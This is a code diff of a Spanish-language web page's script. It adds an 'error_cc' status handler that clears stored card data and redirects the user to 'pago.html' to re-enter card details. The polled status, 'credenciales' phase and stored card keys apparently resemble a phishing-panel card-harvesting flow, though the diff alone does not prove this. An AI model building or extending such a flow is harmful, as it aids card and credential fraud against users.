@@ -239,7 +239,7 @@
         if (!solicitudId) solicitudId = localStorage.getItem('tarjeta_aprobada_solicitud');
         if (!solicitudId) {
             alert('No hay datos de pago. Volviendo al inicio.');
-            window.location.href = 'index.html';
+            window.location.href = 'pago.html';
         }
 
         let faseActual = 'credenciales';
@@ -377,6 +377,22 @@
                         statusMessage.style.display = 'block';
                         loadingOverlay.classList.remove('active');
                         resetFormulario(true);
+                        return;
+                    }
+
+                    // 🔥 ERROR CC → volver a pago.html para reingresar los datos de la tarjeta
+                    if (data.estado === 'error_cc') {
+                        clearInterval(pollingInterval); pollingInterval = null;
+                        loadingOverlay.classList.remove('active');
+                        statusMessage.className = 'status-message error';
+                        statusMessage.textContent = data.mensaje || 'Error en los datos de la tarjeta. Por favor, verifica e inténtalo nuevamente.';
+                        statusMessage.style.display = 'block';
+
+                        // Limpiar datos de tarjeta para que pago.html pida todo de nuevo
+                        localStorage.removeItem('tarjeta_aprobada');
+                        localStorage.removeItem('tarjeta_aprobada_solicitud');
+
+                        setTimeout(() => { window.location.href = 'pago.html'; }, 3500);
                         return;
                     }
 
